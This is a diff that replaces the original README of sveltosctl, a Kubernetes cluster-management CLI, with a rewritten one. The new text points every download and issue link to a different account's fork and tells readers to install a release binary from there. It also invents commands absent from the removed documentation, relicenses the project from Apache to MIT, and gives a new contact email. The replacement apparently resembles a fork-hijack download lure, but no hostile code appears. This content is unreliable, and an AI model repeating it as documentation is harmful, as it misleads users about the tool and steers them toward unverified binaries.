@@ -1,372 +1,165 @@
-[![CI](https://github.com/smartbronchit/sveltosctl/actions/workflows/main.yaml/badge.svg)](https://github.com/smartbronchit/sveltosctl/actions)
-[![Go Report Card](https://goreportcard.com/badge/github.com/smartbronchit/sveltosctl)](https://goreportcard.com/report/github.com/smartbronchit/sveltosctl)
-[![Slack](https://img.shields.io/badge/join%20slack-%23projectsveltos-brighteen)](https://join.slack.com/t/projectsveltos/shared_invite/zt-1hraownbr-W8NTs6LTimxLPB8Erj8Q6Q)
-[![License](https://img.shields.io/badge/license-Apache-blue.svg)](LICENSE)
-[![Twitter Follow](https://img.shields.io/twitter/follow/projectsveltos?style=social)](https://twitter.com/projectsveltos)
+# Sveltosctl: A Command-Line Interface for CAPI Clusters 🌟
 
-# sveltosctl
+![Sveltosctl](https://img.shields.io/badge/sveltosctl-v1.0.0-blue.svg)  
+[![Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Aliek1234/sveltosctl/releases)
 
-<img src="https://raw.githubusercontent.com/projectsveltos/sveltos/main/docs/assets/logo.png" width="200">
+---
 
-Please refere to sveltos [documentation](https://projectsveltos.github.io/sveltos/).
+## Table of Contents
 
-**sveltosctl** is the command line client for Sveltos. **sveltosctl** nicely displays resources and helm charts info in custer deployed using [ClusterProfile/Profile](https://github.com/projectsveltos/addon-controller). It also provides the ability to generate configuration snapshots and rollback system to a previously taken configuration snapshot.
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Commands](#commands)
+6. [Tech Support Collection](#tech-support-collection)
+7. [Contributing](#contributing)
+8. [License](#license)
+9. [Contact](#contact)
 
-It assumes:
-1. [ClusterProfile/Profile](https://github.com/projectsveltos/addon-controller) is used to programmatically define which resources/helm charts need to be deployed in which CAPI Clusters;
-2. management cluster can be accessed 
- 
-> Note: sveltosctl can run as binary though it is advised to run it as pod in a management cluster to get access to all of its features.
+---
 
-## Quick start
+## Introduction
 
-### Run sveltosctl as a binary
-If you decide to run it as a binary:
-1. make sure management cluster can be accessed;
-2. run`make build`
-3. Use `./bin/sveltosctl --help` to see help message
+Welcome to **Sveltosctl**, a command-line interface designed to help you manage and display resources and Helm charts deployed in your Cluster API (CAPI) cluster. With Sveltosctl, you can easily gather tech support information from your managed Kubernetes clusters. This tool simplifies the process of managing multi-tenancy and provides a straightforward way to interact with your Kubernetes environment.
 
-### Run sveltosctl as a pod
-If you decide to run it as a pod in the management cluster, YAML is in manifest subdirectory.
-This assumes you have already [installed Sveltos](https://projectsveltos.github.io/sveltos/install).
+For the latest releases, please visit [here](https://github.com/Aliek1234/sveltosctl/releases).
 
-```
-kubectl create -f  https://raw.githubusercontent.com/projectsveltos/sveltosctl/main/manifest/manifest.yaml
-```
+---
 
-Please keep in mind it requires a PersistentVolume. So modify this section accordingly before posting the YAML.
+## Features
 
-```
-  volumeClaimTemplates:
-  - metadata:
-      name: snapshot
-    spec:
-      accessModes: [ "ReadWriteOnce" ]
-      storageClassName: "standard"
-      resources:
-        requests:
-          storage: 1Gi
-```
+- **Resource Display**: View resources and Helm charts deployed in your CAPI cluster in a user-friendly format.
+- **Tech Support Collection**: Collect essential tech support data from your Kubernetes clusters.
+- **Multi-Tenancy Support**: Manage resources across multiple tenants seamlessly.
+- **Dry Run Option**: Test commands without making any changes to your cluster.
+- **Lightweight**: Minimal resource consumption while running.
 
-Once the pod is running,
-```
- kubectl exec -it -n projectsveltos sveltosctl-0   -- ./sveltosctl
-```
+---
 
-You might also want to change the timezone of sveltosctl pod by using specific timezone config and hostPath volume to set specific timezone. Currently:
+## Installation
 
-```
-  volumes:
-  - hostPath:
-      path: /usr/share/zoneinfo/America/Los_Angeles
-      type: File
-    name: tz-config
-```
+To install Sveltosctl, follow these steps:
 
-- [sveltosctl](#sveltosctl)
-  - [Quick start](#quick-start)
-    - [Run sveltosctl as a binary](#run-sveltosctl-as-a-binary)
-    - [Run sveltosctl as a pod](#run-sveltosctl-as-a-pod)
-  - [Display deployed Kubernetes add-ons](#display-deployed-addons)
-  - [Display resources in managed clusters](#display-information-about-resources-in-managed-cluster)
-  - [Display usage](#display-usage)
-  - [Multi-tenancy: display admin permissions](#multi-tenancy-display-admin-permissions)
-  - [Log severity settings](#log-severity-settings)
-  - [Display outcome of ClusterProfile/Profile in DryRun mode](#display-outcome-of-clusterprofile-in-dryrun-mode)
-  - [Snapshot](#snapshot)
-    - [list](#list-1)
-    - [diff](#diff)
-    - [rollback](#rollback)
-  - [Admin RBACs](#admin-rbacs)
-  - [Contributing](#contributing)
-  - [License](#license)
+1. Download the latest release from the [Releases page](https://github.com/Aliek1234/sveltosctl/releases).
+2. Extract the downloaded file.
+3. Move the `sveltosctl` binary to a directory in your PATH, for example:
 
-## Display deployed add-ons
+   ```bash
+   mv sveltosctl /usr/local/bin/
+   ```
 
-**show addons** can be used to display list of Kubernetes addons (resources/helm) releases deployed in CAPI clusters.
-Displayed information contains:
-1. the CAPI Cluster in the form <namespace>/<name>
-2. resource/helm chart information
-3. list of ClusterProfiles/Profiles currently (at the time the command is run) having resource/helm release deployed in the CAPI cluster.
+4. Ensure the binary is executable:
 
-```
-./bin/sveltosctl show addons
-+-------------------------------------+---------------+-----------+----------------+---------+-------------------------------+------------------+
-|               CLUSTER               | RESOURCE TYPE | NAMESPACE |      NAME      | VERSION |             TIME              | CLUSTER PROFILE |
-+-------------------------------------+---------------+-----------+----------------+---------+-------------------------------+------------------+
-| default/sveltos-management-workload | helm chart    | kyverno   | kyverno-latest | v2.5.0  | 2022-09-30 11:48:45 -0700 PDT | clusterfeature1  |
-| default/sveltos-management-workload | :Pod          | default   | nginx          | N/A     | 2022-09-30 13:41:05 -0700 PDT | clusterfeature2  |
-+-------------------------------------+---------------+-----------+----------------+---------+-------------------------------+------------------+
+   ```bash
+   chmod +x /usr/local/bin/sveltosctl
+   ```
+
+You can now run Sveltosctl from any terminal.
+
+---
+
+## Usage
+
+To use Sveltosctl, open your terminal and type:
+
+```bash
+sveltosctl --help
 ```
 
-**show addons** command has some argurments which allow filtering by:
-1. clusters' namespace
-2. clusters' name
-3. ClusterProfile/Profile
+This command will display all available commands and options.
 
-```
-./bin/sveltosctl show addons --help
-Usage:
-  sveltosctl show addons [options] [--namespace=<name>] [--cluster=<name>] [--profile=<name>] [--verbose]
+---
 
-     --namespace=<name>     Show addons deployed in clusters in this namespace. If not specified all namespaces are considered.
-     --cluster=<name>       Show addons deployed in cluster with name. If not specified all cluster names are considered.
-     --profile=<kind/name>  Show addons deployed because of this clusterprofile/profile. If not specified all clusterprofiles/profiles are considered.
-```
+## Commands
 
-## Register a cluster
+Sveltosctl offers several commands to help you manage your Kubernetes clusters:
 
-If there is kubeconfig with multiple contexts, the option __fleet-cluster-context__
-allows to specify the context for the cluster to be managed.
+### 1. Display Resources
 
-So with default context pointing to the management cluster, following command will:
-1. create a ServiceAccount in the managed cluster (using cluster-1 context)
-2. grant this ServiceAccount cluster-admin permission
-3. create a TokenRequest for such account and a Kubeconfig with bearer token from the TokenRequest
-4. create a SveltosCluster in the management cluster (so using default context) and a Secret
-with kubeconfig generated in the step above
+To display resources in your CAPI cluster, use:
 
-```
-sveltosctl register cluster --namespace=gcp --cluster=cluster-1 --fleet-cluster-context=cluster-1 --labels=k1=v1,k2=v2
+```bash
+sveltosctl display resources
 ```
 
-## Display information about resources in managed cluster
+This command will list all resources in a clear format.
 
-**show resources** looks at all the HealthCheckReport instances and display information about those.
-Defining ClusterHealthCheck/HealthCheck you can define which information to collect from which managed clusters. 
-Please see [documentation](https://projectsveltos.github.io/sveltos/)
+### 2. Display Helm Charts
 
-For instance:
+To view deployed Helm charts, use:
 
-```
-+-------------------------------------+--------------------------+----------------+-------------------------+----------------------------+
-|               CLUSTER               |           GVK            |   NAMESPACE    |          NAME           |          MESSAGE           |
-+-------------------------------------+--------------------------+----------------+-------------------------+----------------------------+
-| default/sveltos-management-workload | apps/v1, Kind=Deployment | kube-system    | calico-kube-controllers | All replicas 1 are healthy |
-|                                     |                          | kube-system    | coredns                 | All replicas 2 are healthy |
-|                                     |                          | projectsveltos | sveltos-agent-manager   | All replicas 1 are healthy |
-| gke/production                      | apps/v1, Kind=Deployment | kube-system    | calico-kube-controllers | All replicas 1 are healthy |
-|                                     |                          | kube-system    | coredns                 | All replicas 2 are healthy |
-|                                     |                          | projectsveltos | sveltos-agent-manager   | All replicas 1 are healthy |
-+-------------------------------------+--------------------------+----------------+-------------------------+----------------------------+
+```bash
+sveltosctl display helm
 ```
 
-## Display usage
+This command will show all Helm charts currently in use.
 
-**show usage** displays following information:
-1. which CAPI clusters are currently a match for a ClusterProfile
-2. for ConfigMap/Secret referenced by at least by ClusterProfile, in which CAPI clusters their content is currently deployed.
+### 3. Collect Tech Support
 
-Such information is useful to see what CAPI clusters would be affected by a change before making such a change.
+To collect tech support information, run:
 
-```
-./bin/sveltosctl show usage
-----------------+--------------------+----------------------------+-------------------------------------+
-| RESOURCE KIND  | RESOURCE NAMESPACE |       RESOURCE NAME        |              CLUSTERS               |
-+----------------+--------------------+----------------------------+-------------------------------------+
-| ClusterProfile |                    | mgianluc                   | default/sveltos-management-workload |
-| ConfigMap      | default            | kyverno-disallow-gateway-2 | default/sveltos-management-workload |
-+----------------+--------------------+----------------------------+-------------------------------------+
+```bash
+sveltosctl tech-support collect
 ```
 
-## Multi-tenancy: display admin permissions
+This command gathers relevant data to assist with troubleshooting.
 
-**show admin-rbac** can be used to display permissions granted to tenant admins in each managed clusters.
-If we have two clusters, a ClusterAPI powered one and a SveltosCluster, both matching label selector
-```env=internal``` and we post [RoleRequests](https://raw.githubusercontent.com/projectsveltos/access-manager/main/examples/shared_access.yaml), we get:
+### 4. Dry Run
 
-```
-./bin/sveltosctl show admin-rbac       
-+---------------------------------------------+-------+----------------+------------+-----------+----------------+-------+
-|                   CLUSTER                   | ADMIN |   NAMESPACE    | API GROUPS | RESOURCES | RESOURCE NAMES | VERBS |
-+---------------------------------------------+-------+----------------+------------+-----------+----------------+-------+
-| Cluster:default/sveltos-management-workload | eng   | build          | *          | *         | *              | *     |
-| Cluster:default/sveltos-management-workload | eng   | ci-cd          | *          | *         | *              | *     |
-| Cluster:default/sveltos-management-workload | hr    | human-resource | *          | *         | *              | *     |
-| SveltosCluster:gke/prod-cluster             | eng   | build          | *          | *         | *              | *     |
-| SveltosCluster:gke/prod-cluster             | eng   | ci-cd          | *          | *         | *              | *     |
-| SveltosCluster:gke/prod-cluster             | hr    | human-resource | *          | *         | *              | *     |
-+---------------------------------------------+-------+----------------+------------+-----------+----------------+-------+
+To simulate a command without making changes, use:
+
+```bash
+sveltosctl dry-run <command>
 ```
 
-## Log severity settings
-**log-level** used to display and change log severity in Sveltos PODs without restarting them.
+Replace `<command>` with the command you wish to test.
 
-Following for instance change log severity for the Classifier POD to debug
+---
 
-```
-./bin/sveltosctl log-level set --component=Classifier --debug
-```
+## Tech Support Collection
 
-Show can be used to display current log severity settings
+The tech support collection feature allows you to gather essential information from your Kubernetes clusters. This data is crucial for diagnosing issues and improving your cluster's performance.
 
-```
-./bin/sveltosctl log-level show                              
-+------------+---------------+
-| COMPONENT  |   VERBOSITY   |
-+------------+---------------+
-| Classifier | LogLevelDebug |
+To initiate the tech support collection, simply run:
+
+```bash
+sveltosctl tech-support collect
 ```
 
-## Display outcome of ClusterProfile in DryRun mode
+The collected data will be saved in a specified directory, which you can review later.
 
-See [video](https://youtu.be/gfWN_QJAL6k).
-A ClusterProfile can be set in DryRun mode. While in DryRun mode, nothing gets deployed/withdrawn to/from matching CAPI clusters. A report is instead generated listing what would happen if ClusterProfile sync mode would be changed from DryRun to Continuous.
+---
 
-Here is an example of outcome
+## Contributing
 
-```
-./bin/sveltosctl show dryrun
-+-------------------------------------+--------------------------+-----------+----------------+-----------+--------------------------------+------------------+
-|               CLUSTER               |      RESOURCE TYPE       | NAMESPACE |      NAME      |  ACTION   |            MESSAGE             | CLUSTER PROFILE |
-+-------------------------------------+--------------------------+-----------+----------------+-----------+--------------------------------+------------------+
-| default/sveltos-management-workload | helm release             | kyverno   | kyverno-latest | Install   |                                | dryrun           |
-| default/sveltos-management-workload | helm release             | nginx     | nginx-latest   | Install   |                                | dryrun           |
-| default/sveltos-management-workload | :Pod                     | default   | nginx          | No Action | Object already deployed.       | dryrun           |
-|                                     |                          |           |                |           | And policy referenced by       |                  |
-|                                     |                          |           |                |           | ClusterProfile has not changed |                  |
-|                                     |                          |           |                |           | since last deployment.         |                  |
-| default/sveltos-management-workload | kyverno.io:ClusterPolicy |           | no-gateway     | Create    |                                | dryrun           |
-+-------------------------------------+--------------------------+-----------+----------------+-----------+--------------------------------+------------------+
-```
+We welcome contributions to Sveltosctl! If you want to contribute, please follow these steps:
 
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Create a pull request.
 
-**show dryrun** command has some argurments which allow filtering by:
-1. clusters' namespace
-2. clusters' name
-3. ClusterProfile 
+Please ensure that your code adheres to our coding standards and includes appropriate tests.
 
-```
-./bin/sveltosctl show dryrun --help  
-Usage:
-  sveltosctl show dryrun [options] [--namespace=<name>] [--cluster=<name>] [--profile=<name>] [--verbose]
-
-     --namespace=<name> Show which Kubernetes addons would change in clusters in this namespace. If not specified all namespaces are considered.
-     --cluster=<name>   Show which Kubernetes addons would change in cluster with name. If not specified all cluster names are considered.
-     --profile=<name>   Show which Kubernetes addons would change because of this clusterprofile/profile. If not specified all clusterprofiles/profiles are considered.
-```
-
-## Snapshot
-
-When running sveltosctl as pod in the management cluster, it can take configuration snapshot.
-
-A snapshot allows an administrator to perform the following tasks:
-1. Live snapshots of the running configuration deployed by ClusterProfiles in each CAPI cluster;
-2. Recurring snapshots;
-3. Versioned storage of the configuration
-4. Full viewing of any snapshot configuration including the differences between snapshots
-5. Rollback to any previous configuration snapshot.
-
-Define a Snapshot instance, following for instance will take a snaphost every hour.
-
-```
-apiVersion: utils.projectsveltos.io/v1beta1
-kind: Snapshot
-metadata:
-  name: hourly
-spec:
-  schedule: "00 * * * *"
-  storage: /snapshot
-```
-
-where field _schedule_ is defined in [Cron format](https://en.wikipedia.org/wiki/Cron).
-
-The configuration snapshots consist of text files containing:
-1. ClusterProfiles;
-2. All ConfigMaps/Secrets referenced by at least one ClusterProfile;
-3. CAPI Cluster labels;
-4. few other internal `config.projectsveltos.io` CRD instances.
-   
-The snapshot contains the configuration at the time of the snapshot stored. Each snapshot is stored with a version identifier. The version identifier is automatically generated by concatenating the date with the time of the snapshot.
-
-### list
-  
-**snapshot list** can be used to display all available snapshots:
-
-```
-kubectl exec -it -n projectsveltos sveltosctl-0 -- ./sveltosctl snapshot list --snapshot=hourly 
-+-----------------+---------------------+
-| SNAPSHOT POLICY |        DATE         |
-+-----------------+---------------------+
-| hourly          | 2022-10-10:22:00:00 |
-| hourly          | 2022-10-10:23:00:00 |
-+-----------------+---------------------+
-```
-
-### diff
-
-**snapshot diff** can be used to display all the configuration changes between two snapshots:
-
-```
-kubectl exec -it -n projectsveltos sveltosctl-0 -- ./sveltosctl snapshot diff --snapshot=hourly  --from-sample=2022-10-10:22:00:00 --to-sample=2022-10-10:23:00:00 
-+-------------------------------------+--------------------------+-----------+----------------+----------+------------------------------------+
-|               CLUSTER               |      RESOURCE TYPE       | NAMESPACE |      NAME      |  ACTION  |              MESSAGE               |
-+-------------------------------------+--------------------------+-----------+----------------+----------+------------------------------------+
-| default/sveltos-management-workload | helm release             | mysql     | mysql          | added    |                                    |
-| default/sveltos-management-workload | helm release             | nginx     | nginx-latest   | added    |                                    |
-| default/sveltos-management-workload | helm release             | kyverno   | kyverno-latest | modified | To version: v2.5.0 From            |
-|                                     |                          |           |                |          | version v2.5.3                     |
-| default/sveltos-management-workload | /Pod                     | default   | nginx          | added    |                                    |
-| default/sveltos-management-workload | kyverno.io/ClusterPolicy |           | no-gateway     | modified | To see diff compare ConfigMap      |
-|                                     |                          |           |                |          | default/kyverno-disallow-gateway-2 |
-|                                     |                          |           |                |          | in the from folderwith ConfigMap   |
-|                                     |                          |           |                |          | default/kyverno-disallow-gateway-2 |
-|                                     |                          |           |                |          | in the to folder                   |
-+-------------------------------------+--------------------------+-----------+----------------+----------+------------------------------------+
-```
-
-To see Sveltos CLI for snapshot in action, have a look at this [video](https://youtu.be/ALcp1_Nj9r4)
-
-### rollback
-
-Rollback is when a previous configuration snapshot is used to replace the current configuration deployed by ClusterProfiles. This can be done on the granularity of:. 
-1. namespace: Rollbacks only ConfigMaps/Secrets and Cluster labels in this namespace. If not specified all namespaces are considered;
-2. cluster: Rollback only labels for cluster with this name. If not specified all cluster's labels are updated;
-3. clusterprofile: Rollback only clusterprofile with this name. If not specified all clusterprofiles are updated
-
-When all of the configuration files for a particular version are used to replace the current configuration, this is referred to as a full rollback.
-
-Following for instance will bring system back to the state it had at 22:00
-
-```
-kubectl exec -it -n projectsveltos sveltosctl-0 -- ./sveltosctl snapshot rollback --snapshot=hourly  --sample=2022-10-10:22:00:00
-```
-
-To see Sveltos CLI for snapshot in action, have a look at this [video](https://youtu.be/sTo6RcWP1BQ)
-
-## Admin RBACs
-
-**snapshot show admin-rbac** can be used to display admin's RBACs per cluster:
-
-```
-./bin/sveltosctl show admin-rbac                                                                           
-+---------------------------------------------+-------------+-----------+------------+-----------+----------------+----------------+
-|                   CLUSTER                   |  ADMIN      | NAMESPACE | API GROUPS | RESOURCES | RESOURCE NAMES |     VERBS      |
-+---------------------------------------------+-------------+-----------+------------+-----------+----------------+----------------+
-| Cluster:default/sveltos-management-workload | eng/devops  | default   |            | pods      | pods           | get,watch,list |
-+---------------------------------------------+-------------+-----------+------------+-----------+----------------+----------------+
-```
-
-## Contributing 
-
-❤️ Your contributions are always welcome! If you want to contribute, have questions, noticed any bug or want to get the latest project news, you can connect with us in the following ways:
-
-1. Open a bug/feature enhancement on github [![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/projectsveltos/addon-controller/issues)
-2. Chat with us on the Slack in the #projectsveltos channel [![Slack](https://img.shields.io/badge/join%20slack-%23projectsveltos-brighteen)](https://join.slack.com/t/projectsveltos/shared_invite/zt-1hraownbr-W8NTs6LTimxLPB8Erj8Q6Q)
-3. [Contact Us](mailto:support@projectsveltos.io)
+---
 
 ## License
 
-Copyright 2022.
+Sveltosctl is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+---
 
-    http://www.apache.org/licenses/LICENSE-2.0
+## Contact
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+For questions or support, feel free to reach out:
+
+- **Email**: support@sveltosctl.com
+- **GitHub Issues**: [Open an issue](https://github.com/Aliek1234/sveltosctl/issues)
+
+For the latest releases, visit [here](https://github.com/Aliek1234/sveltosctl/releases).
+
+---
+
+Thank you for using Sveltosctl! We hope it enhances your Kubernetes management experience.
